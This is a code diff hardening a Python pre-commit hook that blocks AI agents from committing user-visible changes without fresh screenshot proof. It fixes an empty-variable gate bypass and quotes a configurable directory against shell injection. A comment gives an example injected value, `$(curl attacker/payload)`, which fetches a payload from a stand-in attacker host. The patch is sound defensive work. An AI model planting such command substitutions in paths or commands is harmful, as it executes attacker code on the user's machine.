@@ -96,8 +96,13 @@ hatch_escalation = _load_hatch_escalation()
 BLOCK_EXIT_CODE = 10
 HOOK_API = "agents-hooks/v1"
 
-PROOF_DIR = Path(os.path.expanduser(os.environ.get(
-    "VISUAL_PROOF_DIR", "~/.cache/agent-tools/visual-proof")))
+PROOF_DIR = Path(os.path.expanduser(
+    # `.get(..., default)` alone would NOT apply the default for `VISUAL_PROOF_DIR=""`
+    # (explicitly set to empty — os.environ.get returns "" itself, not None, so the default
+    # arg never kicks in) — that resolves to Path("") == cwd, which _proof_fresh() would then
+    # treat ANY fresh file in cwd as proof (silent gate bypass). `or` normalizes empty-string
+    # the same as unset.
+    os.environ.get("VISUAL_PROOF_DIR") or "~/.cache/agent-tools/visual-proof"))
 PROOF_WINDOW_S = int(os.environ.get("VISUAL_PROOF_WINDOW_S", "3600"))
 # Intentionally < the descriptor's `timeout_ms` (8000): the inner python `git diff` timeout
 # must fire FIRST and fail OPEN (allow), rather than the bridge killing the whole hook on its
@@ -721,11 +726,31 @@ def _proof_fresh() -> bool:
 def _block_message(visual: list[str]) -> str:
     """The BLOCK message: what's wrong, how to satisfy the marker, and the hatch how-to."""
     sample = ", ".join(visual[:3]) + (", …" if len(visual) > 3 else "")
+    # shlex.quote the configured dir before it goes into a runnable-looking `touch …` snippet:
+    # VISUAL_PROOF_DIR is env-controlled, and an unquoted value containing shell metacharacters
+    # (e.g. `$(curl attacker/payload)`) would turn this hint into a copy-pasteable injection if
+    # an agent ran it verbatim outside a worktree-isolated session (which is exactly the guard
+    # this message is otherwise steering around).
+    proof_dir_quoted = shlex.quote(str(PROOF_DIR))
     return (
         f"This commit changes user-visible files ({sample}) but no screenshot was captured "
         "and looked at. Per visual-proof-cycle: capture the rendered result, read the capture "
-        f"back, verify it, THEN commit. Touch a file under {PROOF_DIR} when you've reviewed a "
-        "screenshot. No self-service bypass. ASK the human, or request a one-time Telegram "
+        "back, verify it, THEN commit. PRIMARY fix: `dev shot 'http://localhost:PORT/path' "
+        "--out shot.png` (replace the URL with your real one, KEEPING it quoted — an "
+        "unquoted URL with `&`/`;`/`|`/`?` can be reinterpreted by the shell instead of "
+        "passed through as one argument — it captures AND writes the "
+        "proof record for you: no `touch` command, no shell substitution at all — nothing "
+        f"for a worktree-isolated session's guard to trip on). FALLBACK only (no dev "
+        f"server / no URL to shoot): touch a file under {proof_dir_quoted} yourself when "
+        "you've reviewed a screenshot some other way — freshness is judged by mtime, so a "
+        "fixed filename is fine, do NOT reach for `touch .../name-$(date +%s)`: in a "
+        "worktree-isolated session the CLI's own worktree guard refuses "
+        "`$()`/`${...}`/bare `$VAR` in a Bash command even with zero git in it. Write a "
+        f"flat command instead, e.g. `mkdir -p {proof_dir_quoted} && touch "
+        f"{proof_dir_quoted}/proof-key` with no substitution at all (the `mkdir -p` "
+        "covers a fresh machine where the directory doesn't exist yet — a bare `touch` into a "
+        "missing directory fails). No self-service bypass. ASK the human, or request a "
+        "one-time Telegram "
         'approval via RIG_HATCH_REQUEST_VISUAL_PROOF_GATE="<justification>" (deny-by-default; '
         "bare 1 rejected)."
     )
